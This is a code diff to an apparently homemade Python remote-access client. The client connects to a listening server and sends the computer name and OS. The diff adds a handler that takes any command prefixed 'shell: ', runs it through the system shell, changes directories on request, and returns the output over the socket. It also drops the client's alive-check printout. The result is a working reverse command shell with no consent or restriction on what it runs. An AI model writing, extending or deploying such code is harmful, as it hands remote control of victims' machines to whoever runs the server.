@@ -1,6 +1,8 @@
-import socket, os, sys, time, base64, extra, platform
+import socket, os, sys, time, base64, extra, platform, subprocess
 
 data = [os.environ['COMPUTERNAME'], platform.system()]
+
+currentDirectory = os.getcwd()
 
 def connect(host, port):
 	notConnected = True
@@ -27,6 +29,18 @@ conn = connect('localhost', port)
 
 active = True
 
+def checkCommand(data, command):
+	if data[:len(command)] == command:
+		return [True, data[len(command):]]
+	else:
+		return [False, ""]
+
+def send(conn, data):
+	try:
+		conn.send(data.encode("utf8"))
+	except:
+		pass
+
 while active:
 	try:
 		data = conn.recv(1024).decode()
@@ -34,8 +48,6 @@ while active:
 			continue
 
 		if data == "Checking If Alive":
-			print("Telling Server Im Alive")
-			conn.send("Client Is Alive".encode("utf8"))
 			continue
 
 		if data == "disconnect":
@@ -43,6 +55,24 @@ while active:
 			print("Disconnecting Client")
 			continue
 
-		print(data)
-	except:
+		if checkCommand(data, "shell: ")[0]:
+			args = checkCommand(data, "shell: ")[1]
+
+			if checkCommand(args, "cd ")[0]:
+				try:
+					os.chdir(checkCommand(args, "cd ")[1])
+					currentDirectory = os.getcwd()
+					send(conn, "cwd: " + currentDirectory)
+				except Exception as e:
+					send(conn, "Could Not Change To Directory: " + checkCommand(args, "cd ")[1] + ", " + str(e))
+				continue
+
+			try:
+				output = subprocess.run(args, shell=True, check=True, capture_output=True).stdout.decode()
+				conn.send(output.encode("utf8"))
+			except:
+				print("Error Interpreting Command")
+				conn.send(("Command '" + args + "' Is Invalid").encode("utf8"))
+	except Exception as e:
+		print(e)
 		active = False
